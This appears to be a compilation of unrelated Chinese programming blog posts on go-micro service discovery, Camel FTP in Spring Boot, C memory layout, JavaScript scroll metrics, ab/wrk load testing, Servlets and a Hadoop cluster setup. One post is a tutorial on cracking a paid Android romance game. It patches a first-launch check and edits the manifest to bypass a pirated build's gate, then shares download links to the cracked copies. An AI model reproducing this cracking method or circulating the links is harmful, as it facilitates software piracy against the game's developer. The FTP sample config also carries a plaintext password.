go微服务框架go-micro深度学习(三) Registry服务的注册和发现
     服务的注册与发现是微服务必不可少的功能，这样系统才能有更高的性能，更高的可用性。go-micro框架的服务发现有自己能用的接口Registry。只要实现这个接口就可以定制自己的服务注册和发现。
    go-micro在客户端做的负载，典型的Balancing-aware Client模式。
     
     服务端把服务的地址信息保存到Registry, 然后定时的心跳检查，或者定时的重新注册服务。客户端监听Registry，最好是把服务信息保存到本地，监听服务的变动，更新缓存。当调用服务端的接口是时，根据客户端的服务列表和负载算法选择服务端进行通信。
     go-micro的能用Registry接口

type Registry interface {
    Register(*Service, ...RegisterOption) error
    Deregister(*Service) error
    GetService(string) ([]*Service, error)
    ListServices() ([]*Service, error)
    Watch(...WatchOption) (Watcher, error)
    String() string
    Options() Options
}

type Watcher interface {
    // Next is a blocking call
    Next() (*Result, error)
    Stop()
}

　　这个接口还是很简单明了的，看方法也大概能猜到主要的作用
　　Register方法和Deregister是服务端用于注册服务的，Watcher接口是客户端用于监听服务信息变化的。
      接下来我以go-micro的etcdv3为Registry的例给大家详细讲解一下go-micro的详细服务发现过程
go-micro 服务端注册服务
     流程图

     
     服务端看上去流程还是比较简单的，当服务端调用Run()方法时，会调用service.Start()方法。这个除了监听端口，启动服务，还会把服务的ip端口号信息，和所有的公开接口的元数据信息保存到我们选择的Register服务器上去。
     看上去没有问题，但是，如果我们的节点发生故障，也是需要告诉Register把我们的节点信息删除掉。
     Run()方法中有个go s.run(ex) 方法的调用，这个方法就是根据我们设置interval去重新注册服务，当然比较保险的方式是我们把服务的ttl也设置上，这样当服务在未知的情况下崩溃，到了ttl的时间Register服务也会自动把信息删除掉。
 
    设置服务的ttl和 interval

    // 初始化服务
    service := micro.NewService(
        micro.Name(common.ServiceName),
        micro.RegisterTTL(time.Second*30),
        micro.RegisterInterval(time.Second*20),
        micro.Registry(reg),
    )

  ttl就是注册服务的过期时间，interval就是间隔多久再次注册服务。如果系统崩溃，过期时间也会把服务删除掉。客户端当然也会有想就的判断，下面会详细解说 
客户端发现服务
    客户端的服务发现要步骤多一些，但并不复杂，他涉及到服务选择Selector和服务发现Register两部分。
    Selector是基于服务发现的，根据你选择的主机选择算法，返回主机的信息。默认的情况，go-micro是每次要得到服务器主机的信息都要去Register去获取。但是查看cmd.go的源码你会发现默认初始化的值，selector的默认flag是cache。DefaultSelectors里的cache对应的就是初始化cacheSelector方法

 
    但是当你在执行service.Init()方法时

go-micro会把默认的selector替换成cacheSelector,具体的实现是在cmd.go的Before方法里

cacheSelector 会把从Register里获取的主机信息缓存起来。并设置超时时间，如果超时则重新获取。在获取主机信息的时候他会单独跑一个协程，去watch服务的注册，如果有新节点发现，则加到缓存中，如果有节点故障则删除缓存中的节点信息。当client还要根据selector选择的主机选择算法才能得到主机信息，目前只有两种算法，循环和随机法。为了增加执行效率，很client端也会设置缓存连接池，这个点，以后会详细说。
 所以大概的客户端服务发现流程是下面这样

     主要的调用过程都在Call方法内

 
主要的思路是
    从Selector里得到选择主机策略方法next。
    根据Retory是否重试调用服务，调用服务的过程是，从next 方法内得到主机，连接并传输数据 ，如果失败则重试，重试时，会根据主机选择策略方法next重新得到一个新的主机进行操作。
   
     
 
********************************************************************************************************************************************************************************************************
Spring boot项目集成Camel FTP
目录

1、Spring 中集成camel-ftp
1.1、POM引用
1.2、SpringBoot application.yml配置
1.3、配置路由
1.4、配置文件过滤
1.5、文件处理器

2、参考资料


1、Spring 中集成camel-ftp
  近期项目中涉及到定期获取读取并解析ftp服务器上的文件，自己实现ftp-client的有些复杂，因此考虑集成camel-ftp的方式来解决ftp文件的下载问题。自己则专注于文件的解析工作.
demo: https://github.com/LuckyDL/ftp-camel-demo
1.1、POM引用
<dependency>
    <groupId>org.apache.camel</groupId>
    <artifactId>camel-spring-boot-starter</artifactId>
    <version>2.22.1</version>
</dependency>
<dependency>
    <groupId>org.apache.camel</groupId>
    <artifactId>camel-ftp</artifactId>
    <version>2.22.1</version>
</dependency>


注意：
在选择版本的时候，如果SpringBoot版本是1.5.10.RELEASE的话，那么camel的版本最高只能使用2.21.2，使用2.22版本将会报错。经测试的配套关系如下：




SrpingBoot
Camel




1.5
<=2.21.2


2.0
>=2.22.x



其他情况都会出现错误.

1.2、SpringBoot application.yml配置
ftp:
  addr: 172.18.18.19:21    # ftp地址、端口
  name: ftpuser
  password: ftp2018
  options: password=${ftp.password}&readLock=rename&delay=10s&binary=true&filter=#zipFileFilter&noop=true&recursive=true
  url: ftp://${ftp.name}@${ftp.addr}/?${ftp.options}
  # 本地下载目录
  local-dir: /var/data

# 后台运行进程
camel:
  springboot:
    main-run-controller: true

management:
  endpoint:
    camelroutes:
      enabled: true
      read-only: true

配置说明：

delay：每次读取时间间隔
filter: 指定文件过滤器
noop：读取后对源文件不做任何处理
recursive：递归扫描子目录，需要在过滤器中允许扫描子目录
readLock：对正在写入的文件的处理机制

更多参数配置见官方手册

1.3、配置路由
  要配置从远端服务器下载文件到本地，格式如下，from内部为我们在上面配置的url，to为本地文件路径。
@Component
public class DownloadRoute extends RouteBuilder {
    /** logger */
    private static final Logger logger = LoggerFactory.getLogger(DownloadRoute.class);

    @Value("${ftp.server.info}")
    private String sftpServer;
    
    @Value("${ftp.local.dir}")
    private String downloadLocation;
    
    @Autowired
    private DataProcessor dataProcessor;

    @Override
    public void configure() throws Exception{
        from(sftpServer)
                .to(downloadLocation)
                .process(dataProcessor)
                .log(LoggingLevel.INFO, logger, "Download file ${file:name} complete.");
    }
}

说明：
 若将from配置为本地地址，to配置为远端地址，则可以实现向远端服务器上传文件
 process是数据处理器，如果仅仅是下载文件到本地，那么就不需要该配置。

也可以配置多条路由也处理不同的业务：
@Override
    public void configure() throws Exception{
        // route1
        from(sftpServer)
                .to(downloadLocation)
                .process(dataProcessor)
                .log(LoggingLevel.INFO, logger, "Download file ${file:name} complete.");
        // route2
        from(xxx).to(xxxx);
        
        // route3
        from(xxxx).to(xxx).process(xxx);
    }
1.4、配置文件过滤
  如果ftp服务器上有很多文件，但是我们需要的只是其中的一种，全部下载下来，有业务层来实现过滤肯定不合适，我们可以使用camel-ftp的文件过滤器，通过url中的filter来指定，如“filter=#zipFileFilter”,
用户需要实现GenericFileFilter接口的accept方法。
  例如我们只需要下载后缀名为.zip的压缩包到本地，过滤器的编写方法如下，因为我要递归扫描子目录，因此类型为目录的文件也需要允许通过。
/**
 * camel ftp zip文件过滤器
 */
@Component
public class ZipFileFilter implements GenericFileFilter {
    
    @Override
    public boolean accept(GenericFile file) {
        return file.getFileName().endsWith(".zip") || file.isDirectory();
    }
}
1.5、文件处理器
  文件处理器就是我们对下载到本地的文件进行处理的操作，比如我们可能需要对下载的文件重新规划目录；或者解析文件并进行入库操作等。这就需要通过实现Processer的process方法。
  本文中的demo就是通过processor来解析zip包中的文件内容：
@Component
public class DataProcessor implements Processor {

    /** logger */
    private static final Logger logger = LoggerFactory.getLogger(DataProcessor.class);


    @Value("${ftp.local-dir}")
    private String fileDir;

    @Override
    public void process(Exchange exchange) throws Exception {
        GenericFileMessage<RandomAccessFile> inFileMessage = (GenericFileMessage<RandomAccessFile>) exchange.getIn();
        String fileName = inFileMessage.getGenericFile().getFileName();
        String file_path = fileDir + '/' + fileName;
        readZip(file_path);
    }
    
    ...   // 省略数据处理方法
}
2、参考资料
  关于camel ftp的各个参数配置，参见官方手册：http://camel.apache.org/ftp2.html
  此处需要注意的是，camel ftp手册里面只写了ftp独有的一些配置项，camel-ftp组件继承自camel-file，手册里面有说明，就一句话，不注意就可能忽略了，笔者就是没注意，被递归扫描子目录的问题折腾了2天（阅读要细心o(╥﹏╥)o）。。。因此有一些参数配置项可能在camel-ftp手册里面找不到，请移步至：http://camel.apache.org/file2.html
********************************************************************************************************************************************************************************************************
Android破解学习之路（十）—— 我们恋爱吧 三色绘恋 二次破解
前言
好久没有写破解教程了（我不会告诉你我太懒了），找到一款恋爱游戏，像我这样的宅男只能玩玩恋爱游戏感觉一下恋爱的心动了。。
这款游戏免费试玩，但是后续章节得花6元钱购买，我怎么会有钱呢，而且身在吾爱的大家庭里，不破解一波怎么对得起我破解渣渣的身份呢！
哟，还是支付宝购买的，直接9000大法，但是破解的时候没有成功，可能是支付的关键代码在so文件中把，自己还不是很熟悉IDA破解so，所以就撤了，网上找到了别人的破解版本，直接就是解锁版本的。
但是，这破解版的有点奇葩，第一次打开可以正常进入，第二次打开就卡在了它的logo上（破解者加了一个界面显示logo，就是类似XX侠），把它软件下载之后，再次点击就可以正常进入游戏了，支付宝内购破解我破不了，二次破解我总行吧，我的目的就是不用安装APP也能进入游戏
破解思路

既然第一次可以正常进入，第二次就无法进入，肯定是第二次进入的时候做了个验证
破解者加的那个logo界面，应该是有跳转到正常游戏界面的代码，我们直接在logo界面执行跳转代码，跳转到游戏界面
打开游戏的时候直接跳过logo界面，进入游戏主界面

破解开始
思路1
首先，直接丢进Androidkiller中反编译，这款游戏没有加壳，好说，我们由工程信息的入口进到入口界面，展开方法，可以看到许多方法，由于我们猜想是第二次进入的时候做了验证，那么我们就查找一下方法最末尾为Z（代表着此方法返回的是一个Boolean值），可以看到图中红色方框，末尾为Z，名字也是确定了我们的思路没有错，判断是否第一次进入

破解很简单，我们只需要让此方法直接返回一个true的值即可解决

测试是通过的，这里就不放图了
思路2
第一种的方法尽管成功了，但是觉得不太完美，我们看一下能不能直接跳转到游戏的主界面，搜索intent（android中跳转界面都是需要这个intent来完成），没有找到结果，找到的几个都不是跳转到主界面的代码（这游戏的主界面就是MainActivity）
思路2失败
思路3
思路2失败了，我们还有思路3，首先介绍一下，android的APP，主界面是在AndroidManifest.xml这个文件中定义的
我们直接搜索入口类VqsSdkActivity,搜索中的第一个正是我们需要的

点进入就可以看到，定义游戏的启动界面的关键代码，红色框中

我们把这行代码剪切到MainActivity那边去（我们直接搜索MainActivity就可以定位到AndroidManifest中的具体位置）

嗯，测试通过
再加些东西吧，加个弹窗，名字也改一下吧，大功告成！！
测试截图



下载链接
原版破解版： 链接: https://pan.baidu.com/s/1uvjRCkf2hPdI8vI467Vh5g 提取码: p718
二次破解版本： 链接: https://pan.baidu.com/s/128RH5ij3LRjsZPoG3vTTgQ 提取码: vbmv

********************************************************************************************************************************************************************************************************
C语言程序猿必会的内存四区及经典面试题解析
前言：
　　　 为啥叫C语言程序猿必会呢？因为特别重要，学习C语言不知道内存分区，对很多问题你很难解释，如经典的：传值传地址，前者不能改变实参，后者可以，知道为什么？还有经典面试题如下：　

#include <stdio.h>
#include <stdlib.h>#include <stdlib.h>
void getmemory(char *p)
{
p=(char *) malloc(100);
}
int main( )
{
char *str=NULL;
getmemory(str);
strcpy(str,"hello world");
printf("%s/n",str);
free(str);
return 0;
}

　　这段代码执行了会怎么样？接下里我会解释这道面试题。
　　一、内存布局
　　可能网上有很多把内存分的很多、很细，但觉得很难记，并对于理解问题作用并不大。现在主要将内存分为四区如下：
　　代码区：存放代码；运行期间不可修改
　　全局区：全局变量、静态变量、常量字符串；程序运行时存在，退出时消失。
　　栈区：自动变量、函数参数、函数返回值；作用域函数内（代码块内）
　　堆区：动态分配内存，需手动释放
　　用交换两个数的程序进行解释吧，如下：　

#include<stdio.h>

void swap(int a,int b)
{
    int temp = a;    //栈
    a = b;
    b =temp;
}
int main()
{
    int a=1,b=2;    //栈
    printf("a:%d,b:%d\n",a,b);
    swap(a,b);
    printf("a:%d,b:%d\n",a,b);

    return 0;
}

　　画个图进行讲解，如下：　　PS：依旧是全博客园最丑图，不接受反驳！
　　
　　说明：main函数把a,b的值给了temp函数，temp函数在内部交换了值，并没有影响main函数，并且temp结束，栈上的数据释放。传值不会改变实参。
　　二、程序示例及面试题讲解
　　1、传地址交换两个数　　 
 　　在拿传指针的例子来说明一下，如下：

#include<stdio.h>

void swap(int *a,int *b)
{
    int temp = *a;    //栈
    *a = *b;
    *b =temp;
}
int main()
{
    int a=1,b=2;    //栈
    printf("a:%d,b:%d\n",a,b);
    swap(&a,&b);
    printf("a:%d,b:%d\n",a,b);

    return 0;
}

　　结果：成功交换了实参的值
　　用图进行解释，如下：　　PS：依旧是全博客园最丑图，不接受反驳！
　　
　　说明：实参把地址传给形参，形参*a、*b是取的实参在内存中的值，交换也就是交换实参的值了，所以成功交换了实参的值。
　　2、解释面试题
　　程序就是最开始的面试题那个，不再列出来了。
　　结果：段错误
　　然后画图进行说明，如下：　　PS：依旧是全博客园最丑图，不接受反驳！
　　
　　说明：最重要一点实参是把值传给形参，而不是地址，要理解这一点！就是把实参的NULL给了形参，然后getmemory在堆上开辟空间，结束时p被释放了，但main函数中的str并没有指向堆上的内存，再给strcpy,当然会段错误。
　　三、解决被调函数开辟空间
　　可能有人就问了，我就想让被调函数开空间，怎么办呢？那就需要形参是二级指针了。
　　给大家演示一下，代码如下：

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void getmemory(char **p)
{
*p=(char *) malloc(100);
}
int main( )
{
char *str=NULL;
getmemory(&str);
strcpy(str,"hello world");
printf("%s/n",str);
free(str);
return 0;
}

　　结果：没有段错误了
　　大家可以自己画下图，不懂欢迎随时留言。
　　三、十月份计划
　　十月份需求会很忙，但也要抽出时间把C++基础学完，然后深入学习数据结构和算法了
　　
 
********************************************************************************************************************************************************************************************************
JavaScript之scrollTop、scrollHeight、offsetTop、offsetHeight、clientHeight、clientTop学习笔记
全文参考：https://github.com/iuap-design/blog/issues/38 、MDN
clientHeight，只读
 clientHeight  可以用公式  CSS height + CSS padding - 水平滚动条的高度 (如果存在)  来计算。

如图，这样一个div，它的clientHeight为95，计算：50(height)+30(padding-top)+30(padding-bottom)-15(经测量滚动条高度就是15)=95

 

clientTop，只读
一个元素顶部边框的宽度（以像素表示）。嗯。。就只是  border-top-width 
类似的属性还有一个 clientLeft ，顾名思义……
 
offsetHeight，只读
元素的offsetHeight是一种元素CSS高度的衡量标准，包括元素的边框、内边距和元素的水平滚动条（如果存在且渲染的话），是一个整数。
还是上面的图，div的offsetHeight为112。计算：50+60(上下内边距)+2(上下边框)=112
 
offsetTop，只读

HTMLElement.offsetParent 是一个只读属性，返回一个指向最近的包含该元素的定位元素。如果没有定位的元素，则 offsetParent 为最近的 table, table cell 或根元素（标准模式下为 html；quirks 模式下为 body）。当元素的 style.display 设置为 "none" 时，offsetParent 返回 null。




















它返回当前元素相对于其 offsetParent 元素的顶部的距离。
还是上面那张图，div的offsetTop为20，因为margin-top是20，距离html顶部的距离是20...
 
scrollHeight，只读
实话，这么久了，竟然一直搞错这个scroll相关属性，其实它描述的是outer的属性，而窝一直取inner的属性值，难怪scrollTop一直是0。。。

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style>
        #outer {
            margin: 100px 50px;
            background: url(http://images.cnblogs.com/cnblogs_com/wenruo/873448/o_esdese.jpg);
            height: 100px;
            width: 50px;
            padding: 10px 50px;
            overflow: scroll;
        } 
        #inner {
            height: 200px;
            width: 50px;
            background-color: #d0ffe3;
        }
    </style>
</head>
<body>
    <div id="outer">
        <div id="inner"></div>
    </div>
</body>
</html>

 
因为限制了父元素的高度，所以不能全部显示子元素，设置了overflow之后，可以通过滚动条的形式滑动查看子元素。效果如图1，如果没有限制父元素的高度，那么效果将如图2显示。
（图1）                        （图2）
scrollHeight就是图2的高度，没有高度限制时，能够完全显示子元素时的高度（clientHeight）。
所以这里scrollHeight为220，计算：200+10+10=220
 
scrollTop，可写
是这些元素中唯一一个可写可读的。
下面的图是用微信截图随便画的:D（不小心混入了一个光标。。
 
所以当滚动条在最顶端的时候， scrollTop=0 ，当滚动条在最低端的时候， scrollTop=115 
这个115怎么来的（滚动条高度是15，我量的），见下图。（实为我主观臆测，不保证准确性。。。_(:з」∠)_

scrollTop是一个整数。
如果一个元素不能被滚动，它的scrollTop将被设置为0。
设置scrollTop的值小于0，scrollTop 被设为0。
如果设置了超出这个容器可滚动的值, scrollTop 会被设为最大值。
 
判定元素是否滚动到底：

element.scrollHeight - element.scrollTop === element.clientHeight

返回顶部

element.scrollTop = 0

 
一个简单的返回顶部的时间，一个需要注意的地方是，动画是由快到慢的。

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>返回顶部</title>
    <style>
        #outer { height: 100px; width: 100px; padding: 10px 50px; border: 1px solid; overflow: auto; }
    </style>
</head>
<body>
    <div id="outer">
        <div id="inner"></div>
    </div>
    <button onclick="toTop(outer)">返回顶部</button>
    <script>
        function toTop(ele) {
            // ele.scrollTop = 0;
            let dy = ele.scrollTop / 4; // 每次更新scrollTop改变的大小
            if (ele.scrollTop > 0) {
                ele.scrollTop -= Math.max(dy, 10);
                setTimeout(() => {
                    toTop(ele, dy);
                }, 30);
            }
        }
        // 初始化
        window.onload = () => {
            for (let i = 0; i < 233; i++) inner.innerText += `第${i}行\n`;
        }
    </script>
</body>
</html>

 
********************************************************************************************************************************************************************************************************
http性能测试点滴
WeTest 导读
在服务上线之前，性能测试必不可少。本文主要介绍性能测试的流程，需要关注的指标，性能测试工具apache bench的使用，以及常见的坑。
 

 


什么是性能测试


 
性能测试是通过自动化的测试工具模拟多种正常、峰值以及异常负载条件来对系统的各项性能指标进行测试。负载测试和压力测试都属于性能测试，两者可以结合进行。通过负载测试，确定在各种工作负载下系统的性能，目标是测试当负载逐渐增加时，系统各项性能指标的变化情况。压力测试是通过确定一个系统的瓶颈或者不能接受的性能点，来获得系统能提供的最大服务级别的测试。
 


性能测试的目标是什么


性能测试最终的目的，是找到系统的瓶颈，一般来说，是找到服务单机最大TPS(每秒完成的事务数)。
需要注意的是，服务的TPS需要结合请求平均耗时来综合考虑。例如：服务TPS压到1000，平均请求耗时500ms，但是假如我们定的服务请求耗时不能超过200ms，那么这个1000的TPS是无效的。
很多场景下，服务都会设置超时时间，若平均耗时超过此超时时间，则可认为服务处于不可用状态。


什么时候需要性能测试


1.功能测试完成之后，上线之前。
正常情况下，上线之前，都应该进行性能测试，尤其是请求量较大的接口，重点业务的核心接口，以及直接影响用户操作流程的接口。
2.各种大促，运营活动开始之前。
大促，运营活动，都会导致流量激增，因此上线之前做好压力测试，评估系统性能是否满足预估流量，提前做好准备。
举个反面例子：聚美优品，年年大促年年挂。
再来个正面的例子：每年双十一之前，阿里都会有全链路压测，各个业务自己也会有独立的压测，阿里在这块做得还是非常不错的。


怎么做性能测试


常见的http性能测试工具
1. httpload

2. wrk

3. apache bench



 
 
最终我们选择apache bench
 
看上去wrk才是最完美的，但是我们却选择了ab。我们验证过各种工具请求数据是否准确，压测的时候，通过后台日志记录，最终得出结论，ab的请求数误差在千分之二左右，而其他两个工具在千分之五左右。
不过不得不说，wrk的确是一款非常优秀的压测工具，采用异步IO模型，能压到非常高的TPS。曾经用空逻辑接口压到过7w的TPS，而相同接口，ab只能压到2w多。


apache bench的使用


前面已经给了一个简单的例子了，下面详细介绍下ab的使用。
如何安装？如果docker容器已经安装的apache，那么恭喜，ab是apache自带的一个组件，不用重新安装了。当然，也可以自己单独安装apache bench。

ab 常用参数介绍
参数说明：格式：ab [options] [http://]hostname[:port]/path-n requests Number of requests to perform     //本次测试发起的总请求数-c concurrency Number of multiple requests to make　　 //一次产生的请求数（或并发数）-t timelimit Seconds to max. wait for responses　　　　//测试所进行的最大秒数，默认没有时间限制。-r Don't exit on socket receive errors.     // 抛出异常继续执行测试任务 -p postfile File containing data to POST　　//包含了需要POST的数据的文件，文件格式如“p1=1&p2=2”.使用方法是 -p 111.txt-T content-type Content-type header for POSTing//POST数据所使用的Content-type头信息，如 -T “application/x-www-form-urlencoded” 。 （配合-p）-v verbosity How much troubleshooting info to print//设置显示信息的详细程度 – 4或更大值会显示头信息， 3或更大值可以显示响应代码(404, 200等), 2或更大值可以显示警告和其他信息。 -V 显示版本号并退出。-C attribute Add cookie, eg. -C “c1=1234,c2=2,c3=3” (repeatable)//-C cookie-name=value 对请求附加一个Cookie:行。 其典型形式是name=value的一个参数对。此参数可以重复，用逗号分割。提示：可以借助session实现原理传递 JSESSIONID参数， 实现保持会话的功能，如-C ” c1=1234,c2=2,c3=3, JSESSIONID=FF056CD16DA9D71CB131C1D56F0319F8″ 。-w Print out results in HTML tables　　//以HTML表的格式输出结果。默认时，它是白色背景的两列宽度的一张表。-i Use HEAD instead of GET-x attributes String to insert as table attributes-y attributes String to insert as tr attributes-z attributes String to insert as td or th attributes-H attribute Add Arbitrary header line, eg. ‘Accept-Encoding: gzip’ Inserted after all normal header lines. (repeatable)-A attribute Add Basic WWW Authentication, the attributesare a colon separated username and password.-P attribute Add Basic Proxy Authentication, the attributes are a colon separated username and password.-X proxy:port Proxyserver and port number to use-V Print version number and exit-k Use HTTP KeepAlive feature-d Do not show percentiles served table.-S Do not show confidence estimators and warnings.-g filename Output collected data to gnuplot format file.-e filename Output CSV file with percentages served-h Display usage information (this message)
 


性能测试报告



 
测试报告应该包含以下内容。当然，根据场景不同，可以适当增减指标，例如有的业务要求关注cpu，内存，IO等指标，此时就应该加上相关指标。

 


常见的坑


1.AB发送的是http1.0请求。
2.-t可以指定时间，-n指定发送请求总数，同时使用时压测会在-t秒或者发送了-n个请求之后停止。但是-t一定要在-n之前（ab的bug，-n在-t之前最多只会跑5s）。
3.为了使测试结果更可靠，单次压测时间应在2分钟以上。
理论上，压测时间越长，结果误差越小。同时，可以在瓶颈附近进行长时间压测，例如一个小时或者一天，可以用来测试系统稳定性。许多系统的bug都是在持续压力下才会暴露出来。
4.小心压测客户端成为瓶颈。
例如上传，下载接口的压测，此时压测客户端的网络上行，下行速度都会有瓶颈，千万小心服务器还没到达瓶颈时，客户端先到了瓶颈。此时，可以利用多客户端同时压测。
5.ab可以将参数写入文件中，用此种方式可以测试上传文件的接口。
 需要配合-p -t 使用。
 
$ ab -n 10000 -c 8 -p post_image_1k.txt -T "multipart/form-data; boundary=1234567890" http://xxxxxxx
 
文件内容如下：


 
6.ab不支持动态构建请求参数，wrk可配合lua脚本支持动态构建请求参数，还是比较牛的。
package.path = '/root/wrk/?.lua;'local md5 = require "md5"local body   = [[BI_login|userid{145030}|openid{4-22761563}|source{}|affiliate{}|creative{}|family{}|genus{0}|ip{180.111.151.116}|from_uid{0}|login_date{2016-11-04}|login_time{10:40:13}|extra{}|srcid{1}|snid{1002}|clientid{1253}|gameid{2100012}BI_logout|userid{184103}|openid{4-22784181}|family{}|genus{0}|ip{218.2.96.82}|logout_date{2016-11-04}|logout_time{10:40:42}|extra{}|srcid{1}|snid{1002}|clientid{1253}|gameid{2100012}BI_role_logout|roleid{184103}|userid{184103}|openid{4-22784181}|ip{218.2.96.82}|level{100}|money{468}|power{1}|exp{252}|lijin{0}|online_time{0}|mapid{0}|posx{0}|posy{0}|rolelogout_date{2016-11-04}|rolelogout_time{10:40:42}|extra{0}|srcid{0}|snid{1002}|clientid{1253}|gameid{2100012}BI_logout|userid{71084}|openid{4-20974629}|family{}|genus{0}|ip{117.136.8.76}|logout_date{2016-11-04}|logout_time{10:40:43}|extra{}|srcid{1}|snid{1002}|clientid{1253}|gameid{2100012}]] --local body = "hello"wrk.headers["Content-Type"] = "text/xml"local i=0request = function()   i = i+1   local path = "/v1/pub?gameid=510038&timestamp=%s&key=510038&type=basic&sign=%s"   local time = os.time()*1000   local v = "510038" .. time .. "basic98889999"   local sign = md5.sumhexa(v)   path = string.format(path, time, sign)   --print(path)   return wrk.format("POST", path, nil, body)end
 

 

 
腾讯WeTest推出的“压测大师”，一分钟完成用例配置，无需维护测试环境，支持http协议、API接口、网站等主流压测场景。
点击：https://wetest.qq.com/gaps 即可体验。
 
如果使用当中有任何疑问，欢迎联系腾讯WeTest企业QQ：2852350015。
********************************************************************************************************************************************************************************************************
06-码蚁JavaWeb之Servlet生命周期与基本配置
学习地址:[撩课-JavaWeb系列1之基础语法-前端基础][撩课-JavaWeb系列2之XML][撩课-JavaWeb系列3之MySQL][撩课-JavaWeb系列4之JDBC][撩课-JavaWeb系列5之web服务器-idea]
 

Servlet生命周期

Servlet什么时候被创建
1.默认情况下第一次访问的时候创建
2.可以通过配置文件设置服务器启动的时候就创建





`init()`
    servlet对象创建的时候调用
    默认第一次访问时创建
`service()`
    每次请求都会执行一次
`destroy()`
    servlet对象销毁的时候执行
    默认服务器关闭时销毁
`load-on-startup配置`
    对象在服务器启动时就创建
    值为数字代表优先级
    数据越小，优先级越高，不能为负数


Servlet配置信息

初始化参数

<init-params>
    <init-name>名称</init-name>
    <init-value>值</init-value>
    config参数
        该servlert的配置信息
        获得web.xml当中参数
        初始化参数
        获取servletContext对象

url-patten
1.完全匹配
        
2.目录匹配
        
3.扩展名匹配

缺省Servlet
访问的资源不存在时，就会找缺省的地址
<url-patten>/</url-patten>]

全局Web.xml
对于部署在服务器上的所有应用都有效
先到自己工程当中找web.xml配置
再到全局web.xml当中去找配置
如果两个当中有相同的配置
自己当中配置的内容会生效

静态资源加载过程
在path后面写的静态资源名称index.html
或者是其它的.html
它都是会找ur-patten当中
有没有匹配的内容

如果有，就加载对应的servlet
如果没有
就到自己配置当中
找缺省的url-patten

如果自己配置文件当中
没有缺省的
就会找全局配置缺省的url-patten

在全局配置当中
有一个缺省的url-patten 
对应的是default的Servlet
defaultServlet内部
会到当前访问的工程根目录当中
去找对应的名称的静态资源

如果有，
就把里面的内容逐行读出。
响应给浏览器。
如果没有，就会报404错误

欢迎页面
Welcome-file-list
不写任何资源名称的时候，会访问欢迎页面
默认从上往下找



配套 博文 视频 讲解 点击以下链接查看
https://study.163.com/course/courseMain.htm?courseId=1005981003&share=2&shareId=1028240359




********************************************************************************************************************************************************************************************************
Centos7 搭建 hadoop3.1.1 集群教程
 


配置环境要求：



Centos7
jdk 8
Vmware 14 pro
hadoop 3.1.1


Hadoop下载






安装4台虚拟机，如图所示







克隆之后需要更改网卡选项，ip，mac地址，uuid


 

重启网卡:
 


为了方便使用，操作时使用的root账户




 设置机器名称






再使用hostname命令，观察是否更改
类似的，更改其他三台机器hdp-02、hdp-03、hdp-04。



在任意一台机器Centos7上修改域名映射
vi /etc/hosts
修改如下

使用scp命令发送其他克隆机上    scp /etc/hosts 192.168.126.124:/etc/



给四台机器生成密钥文件



 确认生成。
把每一台机器的密钥都发送到hdp-01上（包括自己）
将所有密钥都复制到每一台机器上



在每一台机器上测试



无需密码则成功，保证四台机器之间可以免密登录



安装Hadoop



在usr目录下创建Hadoop目录，以保证Hadoop生态圈在该目录下。
使用xsell+xFTP传输文

解压缩Hadoop



配置java与hadoop环境变量


1 export JAVA_HOME=/usr/jdk/jdk1.8.0_131
2 export JRE_HOME=${JAVA_HOME}/jre
3 export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib
4 export PATH=${JAVA_HOME}/bin:$PATH
5 
6 export HADOOP_HOME=/usr/hadoop/hadoop-3.1.1/
7 export PATH=$PATH:$JAVA_HOME/bin:$HADOOP_HOME/bin:$HADOOP_HOME/sbin

注意：以上四台机器都需要配置环境变量


修改etc/hadoop中的配置文件
注：除了个别提示，其余文件只用修改hdp-01中的即可



修改core-site.xml 

 1 <configuration>
 2 <property>
 3 <name>fs.defaultFS</name>
 4 <value>hdfs://hdp-01:9000</value>
 5 </property>
 6  <property>
 7   <name>hadoop.tmp.dir</name>
 8     <!-- 以下为存放临时文件的路径 -->
 9   <value>/opt/hadoop/hadoop-3.1.1/data/tmp</value>
10  </property>
11 </configuration>

 


修改hadoop-env.sh

1 export JAVA_HOME=/usr/jdk/jdk1.8.0_131

 
注：该步骤需要四台都配置


修改hdfs-site.xml

 1 <configuration>
 2 <property>
 3   <name>dfs.namenode.http-address</name>
 4  <!-- hserver1 修改为你的机器名或者ip -->
 5   <value>hdp-01:50070</value>
 6  </property>
 7  <property>
 8   <name>dfs.namenode.name.dir</name>
 9   <value>/hadoop/name</value>
10  </property>
11  <property>
12   <name>dfs.replication</name>
13    <!-- 备份次数 -->
14   <value>1</value>
15  </property>
16  <property>
17   <name>dfs.datanode.data.dir</name>
18   <value>/hadoop/data</value>
19  </property>
20 
21 
22 </configuration>

 


 修改mapred-site.xml

1 <configuration>
2 <property>
3 <name>mapreduce.framework.name</name>
4 <value>yarn</value>
5 </property>
6 </configuration>



修改 workers

1 hdp-01
2 hdp-02
3 hdp-03
4 hdp-04



 修改yarn-site.xml文件

 1 <configuration>
 2 
 3 <!-- Site specific YARN configuration properties -->
 4 <property>
 5 <name>yarn.resourcemanager.hostname</name>
 6  <value>hdp-01</value>
 7 </property>
 8 <property>
 9  <name>yarn.nodemanager.aux-services</name>
10   <value>mapreduce_shuffle</value>
11 </property>
12  <property>
13   <name>yarn.nodemanager.aux-services.mapreduce.shuffle.class</name>
14 <value>org.apache.hadoop.mapred.ShuffleHandler</value>
15 </property>
16 <property>
17  <name>yarn.nodemanager.resource.cpu-vcores</name>
18  <value>1</value>
19 </property>
20 
21 </configuration>

注：可以把整个/usr/hadoop目录所有文件复制到其余三个机器上 还是通过scp 嫌麻烦的可以先整一台机器，然后再克隆




启动Hadoop




在namenode上初始化
因为hdp-01是namenode，hdp-02、hdp=03和hdp-04都是datanode，所以只需要对hdp-01进行初始化操作，也就是对hdfs进行格式化。
 执行初始化脚本，也就是执行命令：hdfs namenode  -format
等待一会后，不报错返回 “Exiting with status 0” 为成功，“Exiting with status 1”为失败
 


在namenode上执行启动命令
直接执行start-all.sh 观察是否报错，如报错执行一下内容
$ vim sbin/start-dfs.sh
$ vim sbin/stop-dfs.sh
在空白位置加入

1 HDFS_DATANODE_USER=root
2 
3 HADOOP_SECURE_DN_USER=hdfs
4 
5 HDFS_NAMENODE_USER=root
6 
7 HDFS_SECONDARYNAMENODE_USER=root

 
 
$ vim sbin/start-yarn.sh 
$ vim sbin/stop-yarn.sh 
在空白位置加入

1 YARN_RESOURCEMANAGER_USER=root
2 
